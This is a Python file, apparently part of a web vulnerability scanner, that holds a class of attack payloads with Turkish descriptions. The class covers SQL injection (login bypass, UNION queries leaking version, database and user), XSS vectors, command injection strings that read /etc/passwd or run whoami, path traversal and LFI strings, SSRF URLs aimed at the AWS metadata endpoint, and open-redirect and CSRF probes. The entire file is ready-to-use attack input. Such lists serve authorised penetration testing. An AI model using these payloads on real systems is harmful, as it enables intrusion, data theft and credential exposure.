#!/usr/bin/env python3
# -*- coding: utf-8 -*-

class Payloads:
    SQL = [
        ("' OR '1'='1", "Basit SQL Injection"),
        ("' OR '1'='1' --", "Yorum satırı ile SQLi"),
        ("' UNION SELECT NULL--", "Union tabanlı SQLi"),
        ("' UNION SELECT NULL,NULL--", "2 kolonlu Union"),
        ("' UNION SELECT NULL,NULL,NULL--", "3 kolonlu Union"),
        ("admin' --", "Admin bypass"),
        ("' OR 1=1--", "Sayısal SQLi"),
        ("' OR '1'='1' ORDER BY 1--", "Order by test"),
        ("' AND SLEEP(5)--", "Zaman tabanlı (MySQL)"),
        ("' WAITFOR DELAY '00:00:05'--", "Zaman tabanlı (MSSQL)"),
        ("' UNION SELECT @@version--", "Versyon sızdırma"),
        ("' UNION SELECT database()--", "Veritabanı adı"),
        ("' UNION SELECT user()--", "Kullanıcı adı"),
    ]
    
    XSS = [
        ("<script>alert('XSS')</script>", "Temel XSS"),
        ("<img src=x onerror=alert(1)>", "Resim XSS"),
        ("<svg onload=alert(1)>", "SVG XSS"),
        ("javascript:alert(1)", "JS protokolü"),
        ("\"><script>alert(1)</script>", "Etiket kırma"),
        ("'><script>alert(1)</script>", "Etiket kırma 2"),
        ("<body onload=alert(1)>", "Body XSS"),
        ("<input onfocus=alert(1) autofocus>", "Input XSS"),
        ("<details open ontoggle=alert(1)>", "Details XSS"),
        ("<iframe src=javascript:alert(1)>", "Iframe XSS"),
    ]
    
    COMMAND = [
        ("; ls", "Temel komut"),
        ("; ls -la", "Detaylı listeleme"),
        ("| dir", "Windows komutu"),
        ("; cat /etc/passwd", "Passwd okuma"),
        ("; whoami", "Kullanıcı öğrenme"),
        ("; id", "Kullanıcı ID"),
        ("; pwd", "Dizin öğrenme"),
        ("; uname -a", "Sistem bilgisi"),
        ("`ls`", "Backtick enjeksiyon"),
        ("$(ls)", "Bash enjeksiyon"),
    ]
    
    PATH_TRAVERSAL = [
        ("../../../etc/passwd", "Temel traversal"),
        ("../../../../etc/passwd", "Derin traversal"),
        ("..\\..\\..\\windows\\win.ini", "Windows traversal"),
        ("%2e%2e%2fetc%2fpasswd", "URL encoded"),
        ("....//....//....//etc/passwd", "Çift nokta"),
    ]
    
    LFI = [
        ("../../../../var/log/apache2/access.log", "Apache log"),
        ("../../../../proc/self/environ", "Process env"),
        ("php://filter/convert.base64-encode/resource=index.php", "PHP filter"),
    ]
    
    SSRF = [
        ("http://127.0.0.1:80", "Localhost"),
        ("http://127.0.0.1:8080", "Local port"),
        ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
    ]
    
    OPEN_REDIRECT = [
        ("//google.com", "Protokol relative"),
        ("https://google.com", "Absolute URL"),
        ("/\\google.com", "Backslash bypass"),
    ]
    
    CSRF = [
        ("csrf_token=", "CSRF token kontrol"),
        ("authenticity_token=", "Rails CSRF"),
        ("__RequestVerificationToken=", "ASP.NET CSRF"),
        ("csrfmiddlewaretoken=", "Django CSRF"),
    ]